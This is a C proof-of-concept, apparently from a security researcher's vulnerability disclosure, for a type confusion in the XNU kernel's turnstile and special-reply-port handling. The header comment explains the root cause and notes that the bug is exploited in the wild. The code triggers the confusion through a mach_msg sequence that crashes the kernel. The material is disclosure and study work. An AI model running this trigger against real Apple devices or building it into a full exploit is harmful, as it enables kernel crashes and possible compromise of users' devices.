// @i41nbeer
#if 0
XNU kernel type confusion in turnstiles

################
read this note first:

There is a minor change here from the version of this file I shared yesterday:

Previously the final mach_msg receive operation was on the srp port;
now I have changed that to the dst port.

This changed is marked with the string "<<<>>>"

They panic in different ways but the root-cause appears to still be related to the type-confusion
discussed below.

It is my assessment that this vulnerability is unexploitable on devices with PAC on iOS 14 where the host_notify
port's ip_kobject pointer is now tagged.

It is my assessment that this vulnerability remains exploitable on devices without PAC
on iOS 14.
################

Turnstiles are a newish (iOS 12?) feature in iOS; they're a primitive for priority inheritance (I think?)

The important part for the bug is that they added another field to the struct ipc_port kdata union:

	union {
		ipc_kobject_t kobject;               <-- a kobject (like iokit userclient, host_notify port)
		ipc_importance_task_t imp_task;
		ipc_port_t sync_inheritor_port;      <-- the destination port to which a special_reply_port was sent
		struct knote *sync_inheritor_knote;
		struct turnstile *sync_inheritor_ts;
	} kdata;

There are a couple of weird edges cases which the turnstile code overlooked; specifically it's possible
to turn a regular, user-owned port into a port with a kobject! Specifically, by calling
host_request_notification on a send_once right we can change the type of a port to IKOT_HOST_NOTIFY
and get the kobject field set to a struct host_notify_entry pointer.

Send a mach message to a destination port and attach the thread_special_reply_port as the msgh_local_port
with a SEND_ONCE disposition.

The trick to then make something bad happen is to set the MACH_SEND_SYNC_OVERRIDE flag when sending that message,
this allows you to change the ip_sync_link_state value away from PORT_SYNC_LINK_ANY.

After sending that message, convert the thread's special_reply_port to a IKOT_HOST_NOTIFY.

Then attempt to receive a message on that special_reply_port and you'll hit the type-confusion
when ipc_port_adjust_special_reply_port_locked reads special_reply_port->ip_sync_inheritor_port expecting a valid
port pointer, but actually finds a host_notify_entry pointer because the special_reply_port was converted
to a host_notify port.

This will cause a zone_require failure, but there are presumably some more tricks to get around that.

We have evidence that this vulnerability is being exploited in the wild, therefore this bug
is subject to a 7-day disclosure deadline beginning today, Thursday October 29th 2020,
and expiring Thursday November 5th 2020.
#endif

#include <stdio.h>
#include <stdlib.h>

#include <mach/mach.h>

extern mach_port_t mach_reply_port(void);
extern mach_port_t thread_get_special_reply_port(void);

int main1() {
    kern_return_t err;
    mach_port_t dst = mach_reply_port();
    printf("dst: 0x%x\n", dst);
    mach_port_t srp = thread_get_special_reply_port();
    printf("srp: 0x%x\n", srp);
    mach_msg_header_t msg = {0};
    msg.msgh_bits = MACH_MSGH_BITS_SET_PORTS(MACH_MSG_TYPE_MAKE_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE, 0);
    msg.msgh_remote_port = dst;
    msg.msgh_local_port = srp;
    msg.msgh_id = 1337;
    msg.msgh_size = sizeof(mach_msg_header_t);
    //err = mach_msg_send(&msg);
    err = mach_msg(&msg, MACH_SEND_SYNC_OVERRIDE | MACH_SEND_MSG, sizeof(msg), 0, 0, 0, 0);
    if (err != KERN_SUCCESS) {
        printf("failed to send: %s\n", mach_error_string(err));
        return 0;
    }
    err = host_request_notification(mach_host_self(), 1, srp);
    if (err != KERN_SUCCESS) {
        printf("failed to request calendar change notification\n");
    }
    mach_msg_header_t* rcv = malloc(0x1000);
    memset(rcv, 0, 0x1000);
    rcv->msgh_size = 0x1000;
    rcv->msgh_local_port = dst;    // <<<>>>
    //rcv->msgh_local_port = srp;  // <<<>>>
    err = mach_msg_receive(rcv);
    if (err != KERN_SUCCESS) {
        printf("failed to receive message\n");
        return 0;
    }
    printf("received\n");
    return 0;
}
